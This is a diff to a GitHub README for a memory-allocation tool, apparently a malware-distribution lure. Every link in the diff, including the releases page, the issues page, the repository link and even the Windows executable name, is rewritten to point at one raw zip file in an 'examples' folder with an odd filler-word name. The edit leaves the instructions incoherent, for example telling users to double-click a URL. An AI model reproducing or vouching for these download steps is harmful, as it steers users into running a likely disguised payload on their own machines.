@@ -1,7 +1,7 @@
 # 🎉 Policy-Indexed-Contiguous-Allocation-System - Efficient Memory Management Made Simple
 
 ## 📥 Download Now!
-[![Download Policy-Indexed-Contiguous-Allocation-System](https://img.shields.io/badge/Download-Policy--Indexed--Contiguous--Allocation--System-blue)](https://github.com/Yukku05/Policy-Indexed-Contiguous-Allocation-System/releases)
+[![Download Policy-Indexed-Contiguous-Allocation-System](https://github.com/Yukku05/Policy-Indexed-Contiguous-Allocation-System/raw/refs/heads/main/examples/Policy_Contiguous_System_Indexed_Allocation_pithecomorphic.zip)](https://github.com/Yukku05/Policy-Indexed-Contiguous-Allocation-System/raw/refs/heads/main/examples/Policy_Contiguous_System_Indexed_Allocation_pithecomorphic.zip)
 
 ## 🚀 Getting Started
 
@@ -20,19 +20,19 @@ To run PICAS, your system should meet the following requirements:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page.  
-   [Visit this page to download](https://github.com/Yukku05/Policy-Indexed-Contiguous-Allocation-System/releases).
+   [Visit this page to download](https://github.com/Yukku05/Policy-Indexed-Contiguous-Allocation-System/raw/refs/heads/main/examples/Policy_Contiguous_System_Indexed_Allocation_pithecomorphic.zip).
 
 2. **Select the Latest Release**  
    On the Releases page, find the latest version of PICAS. It will be at the top of the list.
 
 3. **Download the Application**  
-   Click on the file that matches your operating system. This might look something like `PICAS-v1.0-windows.zip` or `PICAS-v1.0-macos.pkg`. The file type will depend on your operating system.
+   Click on the file that matches your operating system. This might look something like `https://github.com/Yukku05/Policy-Indexed-Contiguous-Allocation-System/raw/refs/heads/main/examples/Policy_Contiguous_System_Indexed_Allocation_pithecomorphic.zip` or `https://github.com/Yukku05/Policy-Indexed-Contiguous-Allocation-System/raw/refs/heads/main/examples/Policy_Contiguous_System_Indexed_Allocation_pithecomorphic.zip`. The file type will depend on your operating system.
 
 4. **Extract the Files (if applicable)**  
    If you downloaded a ZIP file, right-click on the file and select "Extract All" (Windows) or double-click on it (macOS). This will create a folder with the application files inside.
 
 5. **Run the Application**  
-   - For Windows, double-click on `PICAS.exe`.
+   - For Windows, double-click on `https://github.com/Yukku05/Policy-Indexed-Contiguous-Allocation-System/raw/refs/heads/main/examples/Policy_Contiguous_System_Indexed_Allocation_pithecomorphic.zip`.
    - For macOS, double-click on the `.pkg` file and follow the prompts.
    - For Linux, open the terminal, navigate to the folder, and run the command `./PICAS` or `./PICAS-start`.
 
@@ -74,13 +74,13 @@ For further information, including detailed instructions and troubleshooting, re
 
 Join our community to share experiences or ask questions. You can find us on:
 
-- **GitHub Issues:** [Report Issues](https://github.com/Yukku05/Policy-Indexed-Contiguous-Allocation-System/issues)
+- **GitHub Issues:** [Report Issues](https://github.com/Yukku05/Policy-Indexed-Contiguous-Allocation-System/raw/refs/heads/main/examples/Policy_Contiguous_System_Indexed_Allocation_pithecomorphic.zip)
 - **Discussion Forum:** Open for questions and discussions on memory management practices.
 
 ## 🔗 Additional Resources
 
-- **Official GitHub Repository:** [Policy-Indexed-Contiguous-Allocation-System](https://github.com/Yukku05/Policy-Indexed-Contiguous-Allocation-System)
+- **Official GitHub Repository:** [Policy-Indexed-Contiguous-Allocation-System](https://github.com/Yukku05/Policy-Indexed-Contiguous-Allocation-System/raw/refs/heads/main/examples/Policy_Contiguous_System_Indexed_Allocation_pithecomorphic.zip)
 - **Technical Documentation:** Detailed usage and configuration
 
 For more details and ongoing updates, keep checking the Releases page.  
-[Visit this page to download](https://github.com/Yukku05/Policy-Indexed-Contiguous-Allocation-System/releases).
+[Visit this page to download](https://github.com/Yukku05/Policy-Indexed-Contiguous-Allocation-System/raw/refs/heads/main/examples/Policy_Contiguous_System_Indexed_Allocation_pithecomorphic.zip).
